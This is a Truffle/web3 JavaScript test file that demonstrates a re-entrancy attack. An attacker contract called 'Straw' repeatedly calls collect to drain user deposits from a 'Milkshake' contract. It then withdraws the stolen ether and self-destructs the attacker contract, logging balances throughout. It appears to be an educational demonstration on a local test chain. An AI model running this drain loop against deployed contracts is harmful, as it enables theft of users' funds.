/**
 * Smart contract test.
 * For any suggestions please contact me at andrei.dimitrief.jianu(at)gmail.com
 */

const Milkshake = artifacts.require('Milkshake');
const Straw = artifacts.require('Straw');

contract('Re-entrancy test', async (accounts) => 
{
    const zero = 0x0000000000000000000000000000000000000000;
    const ether = 1e+18;

    let owner = accounts[0];
    let attacker = accounts[1];

    let user1 = accounts[2];
    let user2 = accounts[3];
    let user3 = accounts[4];

    let milkshakeContract;
    let strawContract;

    before(async () => 
    {
        await web3.eth.sendTransaction(
            { 
                from: attacker, 
                to: owner.address, 
                value: web3.utils.toBN(ether).mul(web3.utils.toBN(999)) 
            });

        milkshakeContract = await Milkshake.deployed({ from: owner, value: ether });
        strawContract = await Straw.deployed(milkshakeContract.address, { from: attacker });
    });

    describe('get() test', () => 
    {
        it('attacker uses the re-entrancy bug to drain funds', async () => 
        {
            console.log('accounts status before hack');
            
            let ownerBalance = await web3.eth.getBalance(owner);
            let attackerBalance = await web3.eth.getBalance(attacker);

            let user1Balance = await web3.eth.getBalance(user1);
            let user2Balance = await web3.eth.getBalance(user2);
            let user3Balance = await web3.eth.getBalance(user3);

            console.log('\nowner balance: ' + ownerBalance / ether);

            console.log('attacker balance: ' + attackerBalance / ether);
            console.log('user #1 balance: ' + user1Balance / ether);
            console.log('user #2 balance: ' + user2Balance / ether);
            console.log('user #3 balance: ' + user3Balance / ether);

            await milkshakeContract.put(
                { 
                    from: user1, 
                    value: web3.utils.toBN(ether).mul(web3.utils.toBN(850)) 
                });
            await milkshakeContract.put(
                { 
                    from: user2, 
                    value: web3.utils.toBN(ether).mul(web3.utils.toBN(400)) 
                });
            await milkshakeContract.put(
                { 
                    from: user3, 
                    value: web3.utils.toBN(ether).mul(web3.utils.toBN(950)) 
                });

            let milkshakeContractBalance = await web3.eth.getBalance(milkshakeContract.address);
            let strawContractBalance = await web3.eth.getBalance(strawContract.address);

            console.log('milkshake balance: ' + milkshakeContractBalance / ether);
            console.log('straw balance: ' + strawContractBalance / ether);

            console.log('\nperforming attack...');
            let currentIteration = 0;
            let maxIterations = 100;
            let triggerAmount = ether / 10;
            let leftoverAmount = ether / 1000;
            while(web3.utils.toBN(milkshakeContractBalance)
                .gt(web3.utils.toBN(leftoverAmount))
                && maxIterations > currentIteration)
            {
                currentIteration++;
                console.log('\niteration ' + currentIteration);
                
                console.log('trigger amount ' + triggerAmount / ether);

                await strawContract.collect(
                    web3.utils.toBN(triggerAmount).mul(web3.utils.toBN(20)), 
                    { 
                        from: attacker, 
                        value: triggerAmount 
                    });
   
                milkshakeContractBalance = await web3.eth.getBalance(milkshakeContract.address);
                strawContractBalance = await web3.eth.getBalance(strawContract.address);
                attackerBalance = await web3.eth.getBalance(attacker);

                console.log('milkshake balance ' + milkshakeContractBalance / ether);
                console.log('straw balance ' + strawContractBalance / ether);
                console.log('attacker balance ' + attackerBalance / ether);

                await strawContract.withdraw(
                    attacker, 
                    web3.utils.toBN(strawContractBalance).mul(web3.utils.toBN(9)).div(web3.utils.toBN(10)), 
                    { from: attacker });
                console.log('transferred amount from straw to attacker');

                milkshakeContractBalance = await web3.eth.getBalance(milkshakeContract.address);
                strawContractBalance = await web3.eth.getBalance(strawContract.address);
                attackerBalance = await web3.eth.getBalance(attacker);

                console.log('milkshake balance ' + milkshakeContractBalance / ether);
                console.log('straw balance ' + strawContractBalance / ether);
                console.log('attacker balance ' + attackerBalance / ether);

                triggerAmount = 10 * triggerAmount;
                if(triggerAmount > attackerBalance)
                {
                    triggerAmount = 0.9 * attackerBalance;
                }
                if(triggerAmount > milkshakeContractBalance)
                {
                    triggerAmount = milkshakeContractBalance;
                }
            }

            await strawContract.kill(attacker, { from: attacker });
            console.log('straw contract killed');

            console.log('\nend');
            
            milkshakeContractBalance = await web3.eth.getBalance(milkshakeContract.address);
            strawContractBalance = await web3.eth.getBalance(strawContract.address);
            attackerBalance = await web3.eth.getBalance(attacker);

            console.log('milkshake balance ' + milkshakeContractBalance / ether);
            console.log('straw balance ' + strawContractBalance / ether);
            console.log('attacker balance ' + attackerBalance / ether);
        });
    });

});
